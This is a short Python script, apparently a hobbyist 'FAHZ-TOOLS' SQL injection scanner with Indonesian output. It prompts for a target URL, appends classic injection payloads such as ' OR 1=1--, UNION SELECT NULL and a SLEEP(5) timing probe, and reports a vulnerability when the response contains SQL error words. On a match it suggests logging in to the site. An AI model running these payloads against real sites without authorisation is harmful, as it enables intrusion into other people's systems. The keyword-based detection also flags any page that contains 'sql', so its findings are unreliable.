#!/usr/bin/env python3
import requests
import sys

def scan_sql_injection(url):
    payloads = [
        "'", "\"", "' OR '1'='1", "' OR 1=1--", 
        "' UNION SELECT NULL--", "' AND SLEEP(5)--",
        "admin'--", "' OR '1'='1'/*"
    ]
    
    print(f"\n[*] Memindai {url} untuk kerentanan SQL Injection...\n")
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            
            if "mysql" in response.text.lower() or "sql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"\n[✓] FOUND! Kerentanan SQL Injection ditemukan!")
                print(f"[✓] Payload yang bekerja: {payload}")
                print(f"[✓] Coba login di: {url}")
                return True
            else:
                print(f"[*] Testing: {payload} - NOT FOUND", end='\r')
        except:
            pass
    
    print("\n\n[✗] NOT FOUND - Tidak ada kerentanan SQL Injection yang terdeteksi.")
    return False

if __name__ == "__main__":
    print("="*50)
    print("💉 SQL INJECTION SCANNER - FAHZ-TOOLS 💉")
    print("="*50)
    
    target = input("\nMasukkan URL target (contoh: http://example.com/page.php?id=): ")
    scan_sql_injection(target)
